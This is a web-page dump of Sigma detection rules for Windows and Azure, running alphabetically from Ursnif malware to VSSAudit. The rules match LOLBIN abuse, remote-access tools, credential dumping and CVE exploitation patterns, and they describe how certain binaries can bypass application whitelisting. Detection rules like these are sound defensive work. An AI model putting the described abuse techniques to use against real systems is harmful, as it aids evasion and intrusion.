<li><a href="#">title:Ursnif id: 21f17060-b282-4249-ade0-589ea3591558 status: experimental description: Detects new registry key created by Ursnif malware. references: - - author: megan201296 date: 2019/02/13 modified: 2021/06/26 logsource: product: windows category: registry_add detection: selection: EventType: CreateKey TargetObject|contains: '\Software\AppDataLow\Software\Microsoft\' filter: TargetObject|contains: - '\SOFTWARE\AppDataLow\Software\Microsoft\Internet Explorer\' - '\SOFTWARE\AppDataLow\Software\Microsoft\RepService\' - '\SOFTWARE\AppDataLow\Software\Microsoft\IME\' - '\SOFTWARE\AppDataLow\Software\Microsoft\Edge\' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.execution - attack.t1112 
<li><a href="#">title:Ursnif Malware C2 URL Pattern id: 932ac737-33ca-4afd-9869-0d48b391fcc9 status: stable description: Detects Ursnif C2 traffic. references: - author: Thomas Patzke date: 2019/12/19 modified: 2021/08/09 logsource: category: proxy detection: b64encoding: c-uri|contains: - '_2f' - '_2b' urlpatterns: c-uri|contains|all: - '.avi' - '/images/' condition: b64encoding and urlpatterns fields: - c-ip - c-uri - sc-bytes - c-ua falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1566.001 - attack.execution - attack.t1204.002 - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Ursnif Malware Download URL Pattern id: a36ce77e-30db-4ea0-8795-644d7af5dfb4 status: stable description: Detects download of Ursnif malware done by dropper documents. author: Thomas Patzke date: 2019/12/19 modified: 2021/08/09 logsource: category: proxy detection: selection: c-uri|contains|all: - '/' - '.php?l=' c-uri|endswith: '.cab' sc-status: 200 condition: selection fields: - c-ip - c-uri - sc-bytes - c-ua falsepositives: - Unknown level: high 
<li><a href="#">title:Usage of Sysinternals Tools id: 25ffa65d-76d8-4da5-a832-3f2b0136e133 status: experimental description: Detects the usage of Sysinternals Tools due to accepteula key being added to Registry references: - date: 2017/08/28 modified: 2022/06/26 author: Markus Neis logsource: product: windows category: registry_add detection: selection: EventType: CreateKey TargetObject|endswith: '\EulaAccepted' condition: selection falsepositives: - Legitimate use of SysInternals tools - Programs that use the same Registry Key level: low tags: - attack.resource_development - attack.t1588.002 
<li><a href="#">title:Usage of Sysinternals Tools id: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b related: - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133 type: derived status: experimental description: Detects the usage of Sysinternals Tools due to accepteula option being seen in the command line. references: - date: 2017/08/28 modified: 2021/09/12 author: Markus Neis tags: - attack.resource_development - attack.t1588.002 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: ' -accepteula' condition: selection falsepositives: - Legitimate use of SysInternals tools - Programs that use the same Registry Key level: low 
<li><a href="#">title:USB Device Plugged id: 1a4bd6e3-4c6e-405d-a9a3-53a116e341d4 status: test description: Detects plugged USB devices author: Florian Roth references: - - date: 2017/11/09 modified: 2021/11/30 logsource: product: windows service: driver-framework definition: mapping Provider_Name 'Microsoft-Windows-DriverFrameworks-UserMode/Operational' detection: selection: EventID: - 2003 # Loading drivers - 2100 # Pnp or power management - 2102 # Pnp or power management condition: selection falsepositives: - Legitimate administrative activity level: low tags: - attack.initial_access - attack.t1200 
<li><a href="#">title:Use Get-NetTCPConnection id: aff815cc-e400-4bf0-a47a-5d8a2407d4e1 status: experimental description: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. references: - author: frack113 date: 2021/12/10 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection: ContextInfo|contains: 'Get-NetTCPConnection' condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1049 
<li><a href="#">title:Use Get-NetTCPConnection id: b366adb4-d63d-422d-8a2c-186463b5ded0 status: experimental description: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. references: - author: frack113 date: 2021/12/10 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection: HostApplication|contains: Get-NetTCPConnection condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1049 
<li><a href="#">title:Use of Adplus.exe id: 2f869d59-7f6a-4931-992c-cce556ff2d53 status: experimental description: The "AdPlus.exe" binary that is part of the Windows SDK can be used as a lolbin to dump process memory and execute arbitrary commands author: Nasreddine Bencherchali references: - - - date: 2022/06/09 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\adplus.exe' - OriginalFileName: 'Adplus.exe' selection_cli: CommandLine|contains: # Dump process memory - ' -hang ' - ' -pn ' - ' -pmn ' - ' -p ' - ' -po ' # Using a config file - ' -c ' # Execute commands inline - ' -sc ' condition: all of selection* falsepositives: - Legitimate usage of Adplus level: medium tags: - attack.defense_evasion - attack.execution - attack.t1003.001 
<li><a href="#">title:Use of Anydesk Remote Access Software from Suspicious Folder id: 065b00ca-5d5c-4557-ac95-64a6d0b64d86 status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - author: Florian Roth date: 2022/05/20 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\AnyDesk.exe' - Description: AnyDesk - Product: AnyDesk - Company: AnyDesk Software GmbH filter: Image|contains: - '\\AppData\\' - 'Program Files (x86)\\AnyDesk' - 'Program Files\\AnyDesk' condition: selection and not filter falsepositives: - Legitimate use of AnyDesk from a non-standard folder level: high tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:Use of Anydesk Remote Access Software id: b52e84a3-029e-4529-b09b-71d19dd27e94 status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - author: frack113 date: 2022/02/11 logsource: category: process_creation product: windows detection: selection: - Description: AnyDesk - Product: AnyDesk - Company: AnyDesk Software GmbH condition: selection falsepositives: - Legitimate use level: medium tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:Use of CLIP id: ddeff553-5233-4ae9-bbab-d64d2bd634be status: experimental author: frack113 date: 2021/07/27 description: Adversaries may collect data stored in the clipboard from users copying information within or between applications. references: - - tags: - attack.collection - attack.t1115 logsource: category: process_creation product: windows detection: selection: OriginalFileName: clip.exe condition: selection falsepositives: - Unknown level: low 
<li><a href="#">title:Use of Forfiles For Execution id: 9aa5106d-bce3-4b13-86df-3a20f1d5cf0b status: experimental description: Execute commands and binaries from the context of "forfiles". This is used as a LOLBIN for example to bypass application whitelisting. author: Nasreddine Bencherchali references: - - date: 2022/06/14 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: \forfiles.exe - OriginalFileName: forfiles.exe selection_cli_p: CommandLine|contains: - ' /p ' - ' -p ' selection_cli_m: CommandLine|contains: - ' /m ' - ' -m ' selection_cli_c: CommandLine|contains: - ' /c ' - ' -c ' condition: all of selection* falsepositives: - Legitimate use by a via a batch script or by an administrator. level: medium tags: - attack.execution - attack.t1059 
<li><a href="#">title:Use of FSharp Interpreters id: b96b2031-7c17-4473-afe7-a30ce714db29 status: experimental description: The FSharp Interpreters, FsiAnyCpu.exe and FSi.exe, can be used for AWL bypass and is listed in Microsoft recommended block rules. author: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io' references: - - - - date: 2022/06/02 logsource: category: process_creation product: windows detection: selection: - Image|endswith: \fsianycpu.exe - OriginalFileName: fsianycpu.exe - Image|endswith: \fsi.exe - OriginalFileName: fsi.exe condition: selection falsepositives: - Legitimate use by a software developer. level: medium tags: - attack.execution - attack.t1059 
<li><a href="#">title:Use of GoToAssist Remote Access Software id: b6d98a4f-cef0-4abf-bbf6-24132854a83d status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - author: frack113 date: 2022/02/13 logsource: category: process_creation product: windows detection: selection: - Description: 'GoTo Opener' - Product: 'GoTo Opener' - Company: 'LogMeIn, Inc.' condition: selection falsepositives: - Legitimate use level: medium tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:Use of LogMeIn Remote Access Software id: d85873ef-a0f8-4c48-a53a-6b621f11729d status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - author: frack113 date: 2022/02/11 logsource: category: process_creation product: windows detection: selection: - Description: LMIGuardianSvc - Product: LMIGuardianSvc - Company: LogMeIn, Inc. condition: selection falsepositives: - Legitimate use level: medium tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:Use of Mftrace.exe id: 3d48c9d3-1aa6-418d-98d3-8fd3c01a564e status: experimental description: The "Trace log generation tool for Media Foundation Tools" (Mftrace.exe) can be used to execute arbitrary binaries author: Nasreddine Bencherchali references: - date: 2022/06/09 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\mftrace.exe' - OriginalFileName: 'mftrace.exe' selection_cli: # This assumes that when someone use mftrace to launch an ".exe" he will add a space and the binary launched will end with ".exe" CommandLine|contains: '.exe ' CommandLine|endswith: '.exe' parent: ParentImage|endswith: '\mftrace.exe' condition: all of selection* or parent falsepositives: - Legitimate use for tracing purposes level: medium tags: - attack.defense_evasion - attack.t1127 
<li><a href="#">title:Use of OpenConsole id: 814c95cc-8192-4378-a70a-f1aafd877af1 description: Detects usage of OpenConsole binary as a LOLBIN to launch other binaries to bypass application Whitelisting status: experimental references: - author: Nasreddine Bencherchali date: 2022/06/16 logsource: category: process_creation product: windows detection: selection: - OriginalFileName: 'OpenConsole.exe' - Image|endswith: '\OpenConsole.exe' filter: Image|startswith: 'C:\Program Files\WindowsApps\Microsoft.WindowsTerminal' # We exclude the default path for WindowsTerminal condition: selection and not filter falsepositives: - Legitimate use by an administrator level: medium tags: - attack.execution - attack.t1059 
<li><a href="#">title:Use of Pcalua For Execution id: 0955e4e1-c281-4fb9-9ee1-5ee7b4b754d2 status: experimental description: Execute commands and binaries from the context of The program compatibility assistant (Pcalua.exe). This is used as a LOLBIN for example to bypass application whitelisting. author: Nasreddine Bencherchali references: - - date: 2022/06/14 logsource: category: process_creation product: windows detection: selection: Image|endswith: \pcalua.exe CommandLine|contains: ' -a' # No space after the flag because it accepts anything as long as there a "-a" condition: selection falsepositives: - Legitimate use by a via a batch script or by an administrator. level: medium tags: - attack.execution - attack.t1059 
<li><a href="#">title:Use of PktMon.exe id: f956c7c1-0f60-4bc5-b7d7-b39ab3c08908 status: experimental description: Tools to Capture Network Packets on the windows 10 with October 2018 Update or later. author: frack113 references: - date: 2022/03/17 logsource: category: process_creation product: windows detection: selection: - Image|endswith: PktMon.exe - OriginalFileName: PktMon.exe condition: selection falsepositives: - Legitimate use level: medium tags: - attack.credential_access - attack.t1040 
<li><a href="#">title:Use of Remote.exe id: 4eddc365-79b4-43ff-a9d7-99422dc34b93 status: experimental description: Remote.exe is part of WinDbg in the Windows SDK and can be used for AWL bypass and running remote files. author: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io' references: - - date: 2022/06/02 logsource: category: process_creation product: windows detection: selection: - Image|endswith: \remote.exe - OriginalFileName: remote.exe condition: selection falsepositives: - Approved installs of Windows SDK with Debugging Tools for Windows (WinDbg). level: medium tags: - attack.defense_evasion - attack.t1127 
<li><a href="#">title:Use of ScreenConnect Remote Access Software id: 57bff678-25d1-4d6c-8211-8ca106d12053 status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - author: frack113 date: 2022/02/13 logsource: category: process_creation product: windows detection: selection: - Description: 'ScreenConnect Service' - Product: 'ScreenConnect' - Company: 'ScreenConnect Software' condition: selection falsepositives: - Legitimate use level: medium tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:Use of Scriptrunner.exe id: 64760eef-87f7-4ed3-93fd-655668ea9420 status: experimental description: The "ScriptRunner.exe" binary can be abused to porxy execution through it and bypass possible whitelisting author: Nasreddine Bencherchali references: - date: 2022/07/01 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\ScriptRunner.exe' - OriginalFileName: 'ScriptRunner.exe' selection_cli: CommandLine|contains: ' -appvscript ' condition: all of selection* falsepositives: - Legitimate use when App-v is deployed level: medium tags: - attack.defense_evasion - attack.execution - attack.t1218 
<li><a href="#">title:Use of Squirrel.exe id: 45239e6a-b035-4aaf-b339-8ad379fcb67e status: experimental description: The "Squirrel.exe" binary that is part of multiple softwares (Slack, Teams, Discord...etc) can be used as a LOLBIN author: Nasreddine Bencherchali related: - id: fa4b21c9-0057-4493-b289-2556416ae4d7 type: derived references: - date: 2022/06/09 logsource: category: process_creation product: windows detection: selection_img: Image|endswith: '\squirrel.exe' selection_cli: CommandLine|contains: - ' --download ' - ' --update ' - ' --updateRollback=' selection_http: CommandLine|contains: 'http' condition: all of selection* falsepositives: - See rule (fa4b21c9-0057-4493-b289-2556416ae4d7) for possible FPs level: medium tags: - attack.defense_evasion - attack.execution 
<li><a href="#">title:Use of Sysinternals PsService id: 3371f518-5fe3-4cf6-a14b-2a0ae3fd8a4f description: Detects usage of Sysinternals PsService for service reconnaissance or tamper status: experimental references: - author: Nasreddine Bencherchali date: 2022/06/16 tags: - attack.discovery - attack.persistence - attack.t1543.003 logsource: category: process_creation product: windows detection: selection: - OriginalFileName: 'psservice.exe' - Image|endswith: - '\PsService.exe' - '\PsService64.exe' condition: selection falsepositives: - Legitimate use of PsService by an administrator level: medium 
<li><a href="#">title:Use of TTDInject.exe id: b27077d6-23e6-45d2-81a0-e2b356eea5fd status: experimental description: Detects the executiob of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe) author: frack113 references: - date: 2022/05/16 logsource: product: windows category: process_creation detection: selection: - Image|endswith: ttdinject.exe - OriginalFileName: TTDInject.EXE condition: selection falsepositives: - Legitimate use level: medium tags: - attack.defense_evasion - attack.t1127 
<li><a href="#">title:Use of VisualUiaVerifyNative.exe id: b30a8bc5-e21b-4ca2-9420-0a94019ac56a status: experimental description: VisualUiaVerifyNative.exe is a Windows SDK that can be used for AWL bypass and is listed in Microsoft's recommended block rules. author: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io' references: - - - - date: 2022/06/01 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\VisualUiaVerifyNative.exe' - OriginalFileName: 'VisualUiaVerifyNative.exe' condition: selection falsepositives: - Legitimate testing of Microsoft UI parts. level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:Use of VSIISExeLauncher.exe id: 18749301-f1c5-4efc-a4c3-276ff1f5b6f8 status: experimental description: The "VSIISExeLauncher.exe" binary part of the Visual Studio/VS Code can be used to execute arbitrary binaries author: Nasreddine Bencherchali references: - date: 2022/06/09 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\VSIISExeLauncher.exe' - OriginalFileName: 'VSIISExeLauncher.exe' selection_cli: CommandLine|contains: - ' -p ' - ' -a ' condition: all of selection* falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1127 
<li><a href="#">title:Use of Wfc.exe id: 49be8799-7b4d-4fda-ad23-cafbefdebbc5 status: experimental description: The Workflow Command-line Compiler can be used for AWL bypass and is listed in Microsoft's recommended block rules. author: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io' references: - - date: 2022/06/01 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\wfc.exe' - OriginalFileName: 'wfc.exe' condition: selection falsepositives: - Legitimate use by a software developer level: medium tags: - attack.defense_evasion - attack.t1127 
<li><a href="#">title:Use Radmin Viewer Utility id: 5817e76f-4804-41e6-8f1d-5fa0b3ecae2d status: experimental description: An adversary may use Radmin Viewer Utility to remotely control Windows device author: frack113 references: - - date: 2022/01/22 logsource: category: process_creation product: windows detection: selection: - Description: 'Radmin Viewer' - Product: 'Radmin Viewer' - OriginalFileName: 'Radmin.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.lateral_movement - attack.t1072 
<li><a href="#">title:Use Remove-Item to Delete File id: b8af5f36-1361-4ebe-9e76-e36128d947bf status: experimental description: Powershell Remove-Item with -Path to delete a file or a folder with "-Recurse" author: frack113 references: - - date: 2022/01/15 modified: 2022/03/17 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - Remove-Item - '-Path ' filter_reg: ScriptBlockText|contains: - 'HKCU:\' - 'HKLM:\' condition: selection and not filter_reg falsepositives: - Legitimate PowerShell scripts level: low tags: - attack.defense_evasion - attack.t1070.004 
<li><a href="#">title:User Access Blocked by Azure Conditional Access id: 9a60e676-26ac-44c3-814b-0c2a8b977adf status: experimental author: AlertIQ date: 2021/10/10 description: Detect access has been blocked by Conditional Access policies. The access policy does not allow token issuance which might be sightsâ‰ˆ of unauthorizeed login to valid accounts. references: - logsource: product: azure service: signinlogs detection: selection: ResultType: 53003 condition: selection level: medium falsepositives: - Unknown tags: - attack.credential_access - attack.t1110 
<li><a href="#">title:User Added to an Administrator's Azure AD Role id: ebbeb024-5b1d-4e16-9c0c-917f86c708a7 description: User Added to an Administrator's Azure AD Role author: RaphaÃ«l CALVET, @MetallicHack date: 2021/10/04 references: - - logsource: product: azure service: activitylogs detection: selection: Operation: 'Add member to role.' Workload: 'AzureActiveDirectory' ModifiedProperties.NewValue|endswith: - 'Admins' - 'Administrator' condition: selection falsepositives: - PIM (Privileged Identity Management) generates this event each time 'eligible role' is enabled. level: medium status: experimental tags: - attack.persistence - attack.t1098.003 
<li><a href="#">title:User Added to Local Administrators id: c265cf08-3f99-46c1-8d59-328247057d57 description: This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity status: stable author: Florian Roth date: 2017/03/14 modified: 2021/01/17 tags: - attack.privilege_escalation - attack.t1078 - attack.persistence - attack.t1098 logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 4732 selection_group1: TargetUserName|startswith: 'Administr' selection_group2: TargetSid: 'S-1-5-32-544' filter: SubjectUserName|endswith: '$' condition: selection and (1 of selection_group*) and not filter falsepositives: - Legitimate administrative activity level: medium 
<li><a href="#">title:User Couldn't Call a Privileged Service 'LsaRegisterLogonProcess' id: 6daac7fc-77d1-449a-a71a-e6b4d59a0e54 description: The 'LsaRegisterLogonProcess' function verifies that the application making the function call is a logon process by checking that it has the SeTcbPrivilege privilege set. Possible Rubeus tries to get a handle to LSA. status: experimental references: - tags: - attack.lateral_movement - attack.privilege_escalation - attack.t1558.003 author: Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community date: 2019/10/24 modified: 2021/11/30 logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 4673 Service: 'LsaRegisterLogonProcess()' Keywords: '0x8010000000000000' #failure condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Users Added to Global or Device Admin Roles id: 11c767ae-500b-423b-bae3-b234450736ed description: Monitor and alert for users added to device admin roles. author: Michael Epping, '@mepples21' date: 2022/06/28 references: - logsource: product: azure service: auditlogs detection: selection: Category: RoleManagement OperationName|contains|all: - 'Add' - 'member to role' TargetResources|contains: - '7698a772-787b-4ac8-901f-60d6b08affd2' - '62e90394-69f5-4237-9190-012177145e10' condition: selection falsepositives: - Unknown level: high status: experimental tags: - attack.valid_accounts - attack.t1078 
<li><a href="#">title:Using AppVLP To Circumvent ASR File Path Rule id: 9c7e131a-0f2c-4ae0-9d43-b04f4e266d43 status: experimental description: | Application Virtualization Utility is included with Microsoft Office. We are able to abuse "AppVLP" to execute shell commands. Normally, this binary is used for Application Virtualization, but we can use it as an abuse binary to circumvent the ASR file path rule folder or to mark a file as a system file. author: Sreeman date: 2020/03/13 modified: 2022/04/14 logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains: 'appvlp.exe' selection_2: CommandLine|contains: - 'cmd.exe' - 'powershell.exe' selection_3: CommandLine|contains: - '.sh' - '.exe' - '.dll' - '.bin' - '.bat' - '.cmd' - '.js' - '.msh' - '.reg' - '.scr' - '.ps' - '.vb' - '.jar' - '.pl' - '.inf' condition: all of selection_* falsepositives: - Unknown fields: - ParentProcess - CommandLine - ParentCommandLine level: medium tags: - attack.t1218 - attack.defense_evasion - attack.execution 
<li><a href="#">title:Using SettingSyncHost.exe as LOLBin id: b2ddd389-f676-4ac4-845a-e00781a48e5f status: test description: Detects using SettingSyncHost.exe to run hijacked binary author: Anton Kutepov, oscd.community references: - date: 2020/02/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: system_utility: Image|startswith: - 'C:\Windows\System32\' - 'C:\Windows\SysWOW64\' parent_is_settingsynchost: ParentCommandLine|contains|all: - 'cmd.exe /c' - 'RoamDiag.cmd' - '-outputpath' condition: not system_utility and parent_is_settingsynchost fields: - TargetFilename - Image falsepositives: - Unknown level: high tags: - attack.execution - attack.defense_evasion - attack.t1574.008 
<li><a href="#">title:UtilityFunctions.ps1 Proxy Dll id: 0403d67d-6227-4ea8-8145-4e72db7da120 description: Detects the use of a Microsoft signed script executing a managed DLL with PowerShell. status: experimental references: - author: frack113 date: 2022/05/28 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - 'UtilityFunctions.ps1' - 'RegSnapin ' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1216 
<li><a href="#">title:Valid Users Failing to Authenticate From Single Source Using Kerberos id: 5d1d946e-32e6-4d9a-a0dc-0ac022c7eb98 description: Detects multiple failed logins with multiple valid domain accounts from a single source system using the Kerberos protocol. status: experimental author: Mauricio Velazco, frack113 date: 2021/06/01 modified: 2021/07/06 references: - tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection: EventID: 4771 Status: '0x18' filter_computer: TargetUserName|endswith: '$' timeframe: 24h condition: - selection and not filter_computer falsepositives: - Vulnerability scanners - Misconfigured systems - Remote administration tools - VPN terminators - Multiuser systems like Citrix server farms level: medium 
<li><a href="#">title:Valid Users Failing to Authenticate from Single Source Using NTLM id: f88bab7f-b1f4-41bb-bdb1-4b8af35b0470 description: Detects failed logins with multiple valid domain accounts from a single source system using the NTLM protocol. status: experimental author: Mauricio Velazco date: 2021/06/01 modified: 2021/07/07 references: - tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection1: EventID: 4776 Status: '*0xC000006A' #Account logon with misspelled or bad password. filter: TargetUserName: '*$' timeframe: 24h condition: - selection1 and not filter falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium 
<li><a href="#">title:VBA DLL Loaded Via Microsoft Word id: e6ce8457-68b1-485b-9bdd-3c2b5d679aa9 status: test description: Detects DLL's Loaded Via Word Containing VBA Macros author: Antonlovesdnb references: - date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - '\winword.exe' - '\powerpnt.exe' - '\excel.exe' - '\outlook.exe' ImageLoaded|endswith: - '\VBE7.DLL' - '\VBEUI.DLL' - '\VBE7INTL.DLL' condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 
<li><a href="#">title:VBScript Payload Stored in Registry id: 46490193-1b22-4c29-bdd6-5bf63907216f description: Detects VBScript content stored into registry keys as seen being used by UNC2452 group status: experimental date: 2021/03/05 modified: 2022/03/26 author: Florian Roth references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: 'Software\Microsoft\Windows\CurrentVersion' Details|contains: - 'vbscript' - 'jscript' - 'mshtml' - 'RunHTMLApplication' - 'Execute(' - 'CreateObject' - 'RegRead' - 'window.close' filter: TargetObject|contains: 'Software\Microsoft\Windows\CurrentVersion\Run' filter_dotnet: Image|endswith: '\msiexec.exe' TargetObject|contains: '\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\' Details|contains: - '\Microsoft.NET\Primary Interop Assemblies\Microsoft.mshtml.dll' - '<\Microsoft.mshtml,fileVersion=' - 'FL_Microsoft_mshtml_dll_____X86.' - 'Microsoft_mshtml_dll_1_____X86.' - '<\Microsoft.mshtml,culture=' condition: selection and not 1 of filter* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:VeeamBackup Database Credentials Dump id: b57ba453-b384-4ab9-9f40-1038086b4e53 status: experimental author: frack113 date: 2021/12/20 description: Detects dump of credentials in VeeamBackup dbo references: - - tags: - attack.collection - attack.t1005 logsource: category: process_creation product: windows detection: selection_tools: Image|endswith: '\sqlcmd.exe' selection_query: CommandLine|contains|all: - 'SELECT' - 'TOP' - '[VeeamBackup].[dbo].[Credentials]' condition: all of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:Verclsid.exe Runs COM Object id: d06be4b9-8045-428b-a567-740a26d9db25 status: test description: Detects when verclsid.exe is used to run COM object via GUID author: Victor Sergeev, oscd.community references: - - - date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: image_path: Image|endswith: '\verclsid.exe' cmd_s: CommandLine|contains: '/S' cmd_c: CommandLine|contains: '/C' condition: image_path and cmd_c and cmd_s fields: - CommandLine falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:Visual Basic Command Line Compiler Usage id: 7b10f171-7f04-47c7-9fa2-5be43c76e535 status: test description: Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter. author: 'Ensar Åžamil, @sblmsrsn, @oscd_initiative' references: - date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\vbc.exe' Image|endswith: '\cvtres.exe' condition: selection falsepositives: - Utilization of this tool should not be seen in enterprise environment level: high tags: - attack.defense_evasion - attack.t1027.004 
<li><a href="#">title:VMToolsd Suspicious Child Process id: 5687f942-867b-4578-ade7-1e341c46e99a status: experimental description: Detects suspicious child process creations of VMware Tools process which may indicate persistence setup tags: - attack.execution - attack.persistence - attack.t1059 author: behops, Bhabesh Raj date: 2021/10/08 modified: 2022/05/13 references: - fields: - CommandLine - ParentCommandLine - Details falsepositives: - Legitimate use by adminstrator level: high logsource: category: process_creation product: windows detection: selection_parent: ParentImage|endswith: '\vmtoolsd.exe' selection_img: - Image|endswith: - '\cmd.exe' - '\powershell.exe' - '\rundll32.exe' - '\regsvr32.exe' - '\wscript.exe' - '\cscript.exe' - OriginalFileName: - 'Cmd.Exe' - 'PowerShell.EXE' - 'RUNDLL32.EXE' - 'REGSVR32.EXE' - 'wscript.exe' - 'cscript.exe' filter: CommandLine|contains: - '\VMware\VMware Tools\poweron-vm-default.bat' - '\VMware\VMware Tools\poweroff-vm-default.bat' - '\VMware\VMware Tools\resume-vm-default.bat' - '\VMware\VMware Tools\suspend-vm-default.bat' condition: all of selection* and not filter 
<li><a href="#">title:VMware vCenter Server File Upload CVE-2021-22005 id: b014ea07-8ea0-4859-b517-50a4e5b7ecec status: experimental description: Detects exploitation attempts using file upload vulnerability CVE-2021-22005 in the VMWare vCenter Server. author: Sittikorn S date: 2021/09/24 references: - - tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: cs-method: 'POST' c-uri|contains: '/analytics/telemetry/ph/api/hyper/send?' condition: selection falsepositives: - Vulnerability Scanning level: high 
<li><a href="#">title:Volume Shadow Copy Mount id: f512acbf-e662-4903-843e-97ce4652b740 description: Detects volume shadow copy mount status: experimental date: 2020/10/20 modified: 2021/10/13 author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR) tags: - attack.credential_access - attack.t1003.002 references: - logsource: product: windows service: system detection: selection: Provider_Name: Microsoft-Windows-Ntfs EventID: 98 DeviceName|contains: HarddiskVolumeShadowCopy condition: selection falsepositives: - Legitimate use of volume shadow copy mounts (backups maybe). level: low 
<li><a href="#">title:VSSAudit Security Event Source Registration id: e9faba72-4974-4ab2-a4c5-46e25ad59e9b description: Detects the registration of the security event source VSSAudit. It would usually trigger when volume shadow copy operations happen. status: experimental date: 2020/10/20 modified: 2022/04/28 author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR) tags: - attack.credential_access - attack.t1003.002 references: - logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing AuditSourceName: VSSAudit EventID: - 4904 - 4905 condition: selection falsepositives: - Legitimate use of VSSVC. Maybe backup operations. It would usually be done by C:\Windows\System32\VSSVC.exe. level: informational 
